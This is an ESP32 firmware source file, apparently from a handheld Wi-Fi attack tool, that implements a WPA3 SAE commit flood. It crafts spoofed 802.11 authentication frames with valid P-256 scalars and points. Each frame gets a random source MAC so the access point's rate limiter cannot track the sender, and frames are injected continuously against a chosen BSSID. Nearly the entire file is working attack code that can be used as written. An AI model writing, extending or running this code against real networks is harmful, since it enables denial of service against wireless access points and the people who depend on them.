#include "wpa3_sae.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_random.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

#include <mbedtls/ecp.h>
#include <mbedtls/entropy.h>
#include <mbedtls/ctr_drbg.h>
#include <mbedtls/bignum.h>

// ---------------------------------------------------------------------------
// The ieee80211_raw_frame_sanity_check() override that unblocks management
// injection is provided by deauther.cpp — the linker already picks it up so
// we don't need our own copy here. If we ever break the deauther out of the
// build, this file needs its own copy.
// ---------------------------------------------------------------------------

// ---------------------------------------------------------------------------
// 802.11 Auth frame header for SAE Commit (group 19 = P-256, seq = 1).
//
//   Frame Control    : 0xb0, 0x00     (management subtype 11: Authentication)
//   Duration         : 0x00, 0x00
//   Addr1 (dst)      : BSSID          (patched at TX)
//   Addr2 (src)      : spoofed        (patched at TX, rotates per frame)
//   Addr3 (bssid)    : BSSID          (patched at TX)
//   Sequence         : 0x00, 0x00     (the WiFi driver rewrites this)
//   Auth Algo (LE)   : 3 = SAE
//   Auth Txn Seq (LE): 1 = commit
//   Status Code (LE) : 0
//   Group ID (LE)    : 19 = P-256
//
// Total = 24 (MAC hdr) + 8 (SAE fixed) = 32 bytes; then 32-byte scalar and
// 64-byte uncompressed point (X||Y, without the leading 0x04 SEC-1 prefix).
// ---------------------------------------------------------------------------
static const uint8_t s_sae_commit_hdr[] = {
    0xb0, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr1 dst (BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr2 src (spoofed)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,   // Addr3 bssid
    0x00, 0x00,                           // Sequence
    0x03, 0x00, 0x01, 0x00, 0x00, 0x00, 0x13, 0x00,
};
#define SAE_HDR_LEN  (sizeof(s_sae_commit_hdr))
#define SAE_TOTAL    (SAE_HDR_LEN + 32 + 64)

// Base MAC we spoof from. Locally-administered bit set (0x02 on the first
// byte), unicast; each frame rotates the low bytes so we look like a fresh
// station every time — the AP's per-STA rate limiter can't pin us.
static const uint8_t s_base_src[6] = { 0x76, 0xE5, 0x49, 0x85, 0x5F, 0x00 };

static uint8_t         s_bssid[6];
static uint8_t         s_channel = 1;
static TaskHandle_t    s_task    = nullptr;
static volatile bool   s_run     = false;
static volatile uint32_t s_sent  = 0;
static wifi_mode_t     s_prev_mode = WIFI_MODE_NULL;

// mbedTLS state — allocated on start, freed on stop. Group init is expensive
// enough (loads the SECP256R1 constants) that we keep it hot across frames.
static mbedtls_ecp_group   s_group;
static mbedtls_ecp_point   s_point;
static mbedtls_mpi         s_scalar;
static mbedtls_entropy_context  s_entropy;
static mbedtls_ctr_drbg_context s_drbg;
static bool                s_crypto_ready = false;

static bool crypto_setup()
{
    mbedtls_ecp_group_init(&s_group);
    mbedtls_ecp_point_init(&s_point);
    mbedtls_mpi_init(&s_scalar);
    mbedtls_entropy_init(&s_entropy);
    mbedtls_ctr_drbg_init(&s_drbg);

    if (mbedtls_ecp_group_load(&s_group, MBEDTLS_ECP_DP_SECP256R1) != 0) return false;

    const char *pers = "sae-overflow";
    if (mbedtls_ctr_drbg_seed(&s_drbg, mbedtls_entropy_func, &s_entropy,
                              (const unsigned char *)pers, strlen(pers)) != 0)
        return false;

    s_crypto_ready = true;
    return true;
}

static void crypto_teardown()
{
    if (!s_crypto_ready) return;
    mbedtls_ecp_group_free(&s_group);
    mbedtls_ecp_point_free(&s_point);
    mbedtls_mpi_free(&s_scalar);
    mbedtls_ctr_drbg_free(&s_drbg);
    mbedtls_entropy_free(&s_entropy);
    s_crypto_ready = false;
}

// Fill 32 bytes with a scalar in [1, N-1] — rejecting 0 and values ≥ group
// order N (both invalid as ECC scalars). Retries are almost never needed:
// 256-bit random ≥ N happens with probability < 2^-128 for P-256.
static bool make_scalar()
{
    int tries = 0;
    do {
        if (mbedtls_mpi_fill_random(&s_scalar, 32, mbedtls_ctr_drbg_random, &s_drbg) != 0)
            return false;
        if (++tries > 8) return false;
    } while (mbedtls_mpi_cmp_int(&s_scalar, 0) <= 0 ||
             mbedtls_mpi_cmp_mpi(&s_scalar, &s_group.N) >= 0);
    return true;
}

// One SAE Commit frame. Returns true on success (frame accepted for TX).
static bool inject_sae_commit()
{
    uint8_t buf[SAE_TOTAL];
    memset(buf, 0, sizeof(buf));
    memcpy(buf, s_sae_commit_hdr, SAE_HDR_LEN);

    // Patch MAC addresses. Rotate the spoofed source by the frame counter so
    // every packet looks like a distinct station to the AP's SAE tracker.
    memcpy(buf + 4,  s_bssid, 6);            // addr1 dst
    memcpy(buf + 16, s_bssid, 6);            // addr3 bssid
    memcpy(buf + 10, s_base_src, 6);         // addr2 src (base)
    buf[10]     |= 0x02;                     // locally-administered
    buf[10]     &= 0xFE;                     // unicast
    buf[10 + 3] = (uint8_t)(esp_random() & 0xFF);
    buf[10 + 4] = (uint8_t)(esp_random() & 0xFF);
    buf[10 + 5] = (uint8_t)(esp_random() & 0xFF);

    if (!make_scalar()) return false;

    // Write scalar (32B) right after the SAE fixed header.
    if (mbedtls_mpi_write_binary(&s_scalar, buf + SAE_HDR_LEN, 32) != 0)
        return false;

    // Compute the element = scalar · G, serialise uncompressed. Point takes
    // 65 bytes in SEC-1 uncompressed form (0x04 || X || Y); we drop the tag
    // byte and copy the raw 64-byte concatenation, matching what a real WPA3
    // supplicant would send.
    if (mbedtls_ecp_mul(&s_group, &s_point, &s_scalar, &s_group.G,
                        mbedtls_ctr_drbg_random, &s_drbg) != 0) return false;

    uint8_t point_buf[65];
    size_t  point_len = 0;
    if (mbedtls_ecp_point_write_binary(&s_group, &s_point,
                                       MBEDTLS_ECP_PF_UNCOMPRESSED,
                                       &point_len, point_buf, sizeof(point_buf)) != 0)
        return false;
    if (point_len != 65) return false;
    memcpy(buf + SAE_HDR_LEN + 32, point_buf + 1, 64);

    return esp_wifi_80211_tx(WIFI_IF_STA, buf, SAE_TOTAL, false) == ESP_OK;
}

static void sae_task(void *)
{
    while (s_run) {
        esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);
        // Batch a handful of frames per wake-up so the mbedTLS work amortises
        // over the task-switch cost; 50 ms between batches is what projectZero
        // uses and it keeps the CPU responsive for LVGL / touch.
        for (int i = 0; i < 4 && s_run; i++) {
            if (inject_sae_commit()) s_sent++;
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    s_task = nullptr;
    vTaskDelete(nullptr);
}

bool wpa3_sae_start(const uint8_t bssid[6], uint8_t channel)
{
    if (s_run) return true;

    memcpy(s_bssid, bssid, 6);
    s_channel = (channel >= 1 && channel <= 13) ? channel : 1;
    s_sent = 0;

    if (!crypto_setup()) { crypto_teardown(); return false; }

    s_prev_mode = WiFi.getMode();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(s_channel, WIFI_SECOND_CHAN_NONE);

    s_run = true;
    xTaskCreatePinnedToCore(sae_task, "sae_ovf", 8192, nullptr, 1, &s_task, 0);
    return true;
}

void wpa3_sae_stop()
{
    if (s_run) {
        s_run = false;
        for (int i = 0; i < 40 && s_task; i++) vTaskDelay(pdMS_TO_TICKS(5));
    }
    crypto_teardown();
    esp_wifi_set_promiscuous(false);

    // Match the deauther's teardown so the clock-face WiFi indicator reflects
    // reality after we leave — either back to whatever mode was up, or fully
    // down if nothing had the radio to begin with.
    if (s_prev_mode == WIFI_MODE_NULL) {
        WiFi.mode(WIFI_OFF);
        esp_wifi_stop();
        esp_wifi_deinit();
    } else {
        WiFi.mode(s_prev_mode);
    }
    s_prev_mode = WIFI_MODE_NULL;
}

bool     wpa3_sae_is_running()  { return s_run; }
uint32_t wpa3_sae_frames_sent() { return s_sent; }
